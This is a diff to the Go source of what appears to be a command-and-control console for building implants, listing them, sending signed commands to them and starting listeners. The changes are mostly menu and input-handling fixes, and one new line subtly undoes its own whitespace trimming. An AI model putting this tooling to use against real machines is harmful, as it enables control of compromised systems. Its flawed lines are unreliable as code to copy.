@@ -359,6 +359,10 @@ func sign(command string) (string, error) {
 	hash_test := sha256.Sum256(command_bytes)
 
 	signature_bytes, err := base64.StdEncoding.DecodeString(sig)
+	if err != nil {
+		fmt.Printf("Failed to encode string, err %e\n", err)
+		return "", err
+	}
 
 	err = rsa.VerifyPKCS1v15(Pkey.(*rsa.PublicKey), crypto.SHA256, hash_test[:], signature_bytes)
 
@@ -530,6 +534,7 @@ func build(platform, arch, name, listener, jitter, GetURI, PostURI string, sleep
 
 func empty(s string) bool {
 	trimmed := strings.TrimSpace(s)
+	trimmed = strings.ReplaceAll(s, "\n", "")
 	return len(trimmed) == 0
 }
 
@@ -560,15 +565,20 @@ func main() {
 
 			switch {
 			case isEmpty:
+				input = ""
 				fmt.Printf("Help menu \n")
 				fmt.Printf("The interpreter expects 1 - 5 for menu options \n")
 				fmt.Printf("1 will bring you to the build menu where you can build an implant \n")
 				fmt.Printf("2 will bring you to the implant info menu where you can find the last command run and the result \n")
-				fmt.Printf("3 will you to list all implants in the DB \n")
+				fmt.Printf("3 allows you to list all implants in the DB \n")
 				fmt.Printf("4 allows you to interact with implants by setting commands \n")
 				fmt.Printf("5 will let you start a listener on an address and port combo \n")
+				fmt.Printf("6 lets you clear the DB \n")
 				fmt.Printf("'help' will bring you to this menu \n")
+				break
+
 			case input == "1":
+				input = ""
 				var platform, arch, name, listener, jitter, GetURI, PostURI string
 				var sleep int32
 				fmt.Printf("Build menu \n")
@@ -618,6 +628,7 @@ func main() {
 				}
 
 			case input == "2":
+				input = ""
 				var uuid string
 				fmt.Printf("Implant history menu \n")
 				fmt.Printf("Here's where you can interact with all your fun implants \n")
@@ -654,6 +665,7 @@ func main() {
 				}
 
 			case input == "3":
+				input = ""
 				var key string
 				fmt.Printf("Lists all implants and deets \n")
 				fmt.Printf("Just need the key to search for, in most cases this will be UUID \n")
@@ -677,6 +689,7 @@ func main() {
 				}
 
 			case input == "4":
+				input = ""
 				// Need to get a signature
 				// Need to set that signature and command
 				// Need to then wait for the listener to update the db that the command was retrieved
@@ -723,6 +736,7 @@ func main() {
 					switch cmd {
 					case "exit":
 						det = false
+						break
 					default:
 						sig, err := sign(cmd)
 						if err != nil {
@@ -737,9 +751,10 @@ func main() {
 							fmt.Printf("Command set \n")
 						}
 					}
-
 				}
+
 			case input == "5":
+				input = ""
 				var address, port, GetURI, PostURI string
 				fmt.Printf("Listeners \n")
 				fmt.Printf("Start a listener \n")
@@ -750,6 +765,9 @@ func main() {
 				}
 				fmt.Println("Enter the port to use > ")
 				fmt.Scan(&port)
+				if port == "exit" {
+					break
+				}
 
 				fmt.Printf("%sNow we need the URI to serve commands from \n%s", blue, reset)
 				fmt.Printf("%sThis needs to match your associated implant configuration \n%s", blue, reset)
@@ -770,6 +788,7 @@ func main() {
 				fmt.Println("Started")
 
 			case input == "6":
+				input = ""
 				var key string
 				fmt.Printf("Wipe the DB \n")
 				fmt.Printf("This will remove all entries \n")
@@ -784,6 +803,7 @@ func main() {
 				}
 
 			case input == "help":
+				input = ""
 				fmt.Printf("Help menu \n")
 				fmt.Printf("The interpreter expects 1 - 5 for menu options \n")
 				fmt.Printf("1 will bring you to the build menu where you can build an implant \n")
@@ -795,6 +815,7 @@ func main() {
 				fmt.Printf("'help' will bring you to this menu \n")
 
 			default:
+				input = ""
 				fmt.Printf("Help menu \n")
 				fmt.Printf("The interpreter expects 1 - 5 for menu options \n")
 				fmt.Printf("1 will bring you to the build menu where you can build an implant \n")
